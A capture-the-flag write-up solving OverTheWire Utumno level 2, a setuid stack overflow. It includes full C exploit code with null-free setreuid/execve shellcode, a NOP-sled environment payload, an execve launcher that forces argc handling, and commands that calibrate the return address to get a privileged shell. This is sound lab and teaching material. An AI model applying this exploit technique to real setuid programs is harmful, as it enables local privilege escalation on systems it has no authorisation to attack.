# OverTheWire — Utumno Level 2 Solution (utumno2 → utumno3)

> Goal: Get utumno3 user's password from `utumno2`.
> Technique: **Classic stack buffer overflow** (no canary) + NOP sled + shellcode on
> **executable stack**; bypassing the `argc` constraint with a crafted `execve` `argv`/`envp`.

---

## 1. Connection

```bash
ssh utumno2@utumno.labs.overthewire.org -p 2227
# password: ........   (from the previous level)
```

---

## 2. Recon

```bash
ls -la /utumno/utumno2
# -r-sr-x--- 1 utumno3 utumno2 12568 utumno2   <-- SUID utumno3, group utumno2 = READABLE
file /utumno/utumno2
# setuid ELF 32-bit, dynamically linked, with debug_info, not stripped
```

### strings — critical hints
```bash
strings /utumno/utumno2
```
- `strcpy`, `puts`, `exit`, `buffer`, `argv`, `argc`
- Compiler flags: **`-fno-stack-protector`** → **NO stack canary!**

Execution attempts:
```bash
/utumno/utumno2            # "Aw.."  exit=1
/utumno/utumno2 AAAA BBBB  # "Aw.."  exit=1
```

### Mitigation check — is the stack executable?
```bash
readelf -l /utumno/utumno2 | grep -A1 GNU_STACK
# GNU_STACK ... RWE 0x10     <-- R+W+E => STACK EXECUTABLE!
```
ASLR also off (from login banner). So: **no canary + executable stack + no ASLR**
= we can put shellcode on the stack (env) and redirect the return address there.

---

## 3. Static Analysis — `main`

```bash
objdump -d -M intel /utumno/utumno2 | sed -n '/<main>:/,/^$/p'
```

Pseudocode:
```c
int main(int argc, char **argv) {       // [ebp-0xc] = buffer (12 bytes)
    if (argc == 0) goto proceed;
    if (argc != 1) { puts("Aw.."); exit(1); }
    // argc == 1:
    if (argv[0][0] == '\0') goto proceed;   // argv[0] is empty string -> continue
    puts("Aw.."); exit(1);
proceed:
    strcpy(buffer, argv[10]);            // argv[10] = *(argv + 0x28)
    return 0;
}
```

**Two key points:**
1. **To reach `proceed`:** `argc == 0` **OR** (`argc == 1` and `argv[0] == ""`).
   Normal command-line arguments (argc≥2) cannot reach it.
2. **Vulnerability:** `strcpy(buffer[12], argv[10])` — buffer is 12 bytes, no canary.
   - buffer: `[ebp-0xc]` → 12 bytes to saved-ebp, +4 saved ebp = **return address offset 16**.
   - Source `argv[10]` = `*(argv + 0x28)` (40 = 10×4).

---

## 4. Attack Strategy

The `argc` constraint prevents passing normal arguments. Solution: write a **launcher** that
starts the target using `execve` with hand-crafted `argv`/`envp`.

- `execve(path, argv={NULL}, envp=...)` → `argc = 0` (theoretically) → reaches `proceed`.
- `argv[10]` is the source of overflow data → we put it in **`envp`** (in kernel stack layout,
  envp comes right after the argv terminator).
- We put shellcode with a large **NOP sled** in another env variable (stack is RWE).
- Overflow payload = `16 bytes padding + return_address`; return address points to the NOP
  sled midpoint → slides into shellcode → `setreuid` + `execve("/bin/sh")` → **utumno3 shell**.

### How to find the address deterministically?
ASLR is off, so env string addresses are fixed. But we don't want to guess. **Trick:** run a
"printer" program via `execve` under **exactly the same** conditions (same `argc=0` call, same
`envp`, **same-length path** — `"/utumno/utumno2"` = 15 chars) and have it print `environ[0]`.
ASLR off + matching execfn length + same envp ⇒ printer's `environ[0]` = target's `environ[0]`.

> `/tmp/p2A7xK9mLq` (15 chars) was chosen as the printer path so the AT_EXECFN string length
> matches `/utumno/utumno2` (otherwise env addresses would shift).

---

## 5. CRITICAL Bug — Modern Kernel Blocks `argc=0` (off-by-one)

First attempt gave `rc=0`, no shell. The reason is instructive:

> **Linux ≥ 5.18** security fix (commit `dcd46d897adb`, "exec: Force single empty
> string when argv is empty"): if `execve` is called with empty `argv`, the kernel
> **automatically adds `argv[0] = ""`** → `argc` becomes **1, not 0**.

Verified by having the printer print `argc`: `ARGC=1`.

This shifts which `envp` element `argv[10]` maps to by **one**:

| Situation | Stack layout | `argv[10]` = |
|-----------|-------------|--------------|
| `argc=0` (theory) | `[NULL][envp0][envp1]...` | `envp[9]` |
| `argc=1` empty argv0 (reality) | `[""][NULL][envp0]...` | `envp[8]` |

My initial payload was in `envp[9]` but actually `argv[10]=envp[8]="AA=AA"` was read → no overflow,
`main` returned 0 (`rc=0`).

**Solution (robust):** Put the payload in both `envp[8]` and `envp[9]` (both pointing to the
same string) → works regardless of kernel behavior.

---

## 6. Final Exploit

### Shellcode (from utumno1, null-free + slash-free)
`setreuid(geteuid(),geteuid()); execve("/bin/sh",["/bin/sh",0],0)` — 57 bytes.

### `ex.c` — launcher (find + run modes)
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
unsigned char sc[]={
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80,
 0x31,0xc0,0x50,0xb8,0x2e,0x72,0x69,0x01,0x35,0x01,0x01,0x01,0x01,0x50,
 0xb8,0x2e,0x63,0x68,0x6f,0x35,0x01,0x01,0x01,0x01,0x50,0x89,0xe3,
 0x31,0xc0,0x50,0x53,0x89,0xe1,0x31,0xd2,0x31,0xc0,0xb0,0x0b,0xcd,0x80};
#define SLED 60000
static char eggenv[4+SLED+64];     // "EGG=" + NOP sled + shellcode
static char payload[24];           // 16*'B' + retaddr
static char *envp[12];
void build(unsigned int ret){
 memcpy(eggenv,"EGG=",4);
 memset(eggenv+4,0x90,SLED);
 memcpy(eggenv+4+SLED,sc,sizeof sc);
 eggenv[4+SLED+sizeof sc]=0;
 memset(payload,'B',16);
 *(unsigned int*)(payload+16)=ret;  // offset 16 = return address
 payload[20]=0;
 envp[0]=eggenv;
 for(int i=1;i<=7;i++) envp[i]="AA=AA";
 envp[8]=payload; envp[9]=payload;  // cover both argc=0 AND argc=1 cases
 envp[10]=0;
}
int main(int argc,char**argv){
 char *av[]={0};                    // argv = {NULL}
 if(argc>=2 && !strcmp(argv[1],"find")){
   build(0x42424242);
   execve("/tmp/p2A7xK9mLq",av,envp); perror("execve"); return 1;   // 15-char path
 } else if(argc>=3 && !strcmp(argv[1],"run")){
   build(strtoul(argv[2],0,16));
   execve("/utumno/utumno2",av,envp); perror("execve"); return 1;
 }
 return 2;
}
```

### `pr.c` — address + argc printer
```c
#include <stdio.h>
extern char **environ;
int main(int argc,char**argv){
 printf("ARGC=%d ENVADDR=%p\n",argc,(void*)environ[0]);
 return 0;
}
```

### Execution (auto-calibration)
```bash
gcc -m32 -o ex ex.c
gcc -m32 -o /tmp/p2A7xK9mLq pr.c

INFO=$(./ex find)                 # ARGC=1 ENVADDR=0xfffef4f6
ENV0=$(echo "$INFO" | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")   # sled midpoint -> 0xffff6a2a

echo 'id; cat /etc/utumno_pass/utumno3' | ./ex run "$RET"
```

Output:
```
ARGC=1 ENVADDR=0xfffef4f6
RET=0xffff6a2a
uid=16003(utumno3) gid=16002(utumno2) groups=16002(utumno2)
........
```

> Note: `RET = environ[0] + 4 (skip "EGG=") + 30000 (midpoint of 60KB sled)`.
> The large NOP sled absorbs ±20KB of address uncertainty; the chosen address must not contain
> null bytes (strcpy stops at null).

---

## Summary / Lessons Learned

| Topic | Note |
|-------|------|
| **No canary (`-fno-stack-protector`)** | `strcpy` overwrites saved return address directly (offset 16) |
| **Executable stack (`GNU_STACK RWE`)** | Shellcode in env var runs on stack → ret2stack |
| **`argc` constraint** | Can't pass normal arguments → need `execve` with crafted `argv`/`envp` |
| **argc=0 → argv[10]=envp[k]** | Kernel stack layout: envp comes after argv terminator |
| **Linux ≥5.18 empty argv → argc=1** | `execve(argv={NULL})` now adds `argv[0]=""` → index shifts by 1 |
| **Off-by-one defense** | Put payload in both envp[8] and envp[9] |
| **Deterministic address** | ASLR off + matching execfn length + same envp → exact address via printer |
| **NOP sled** | Large sled tolerates address uncertainty; ret-addr must be null-free |
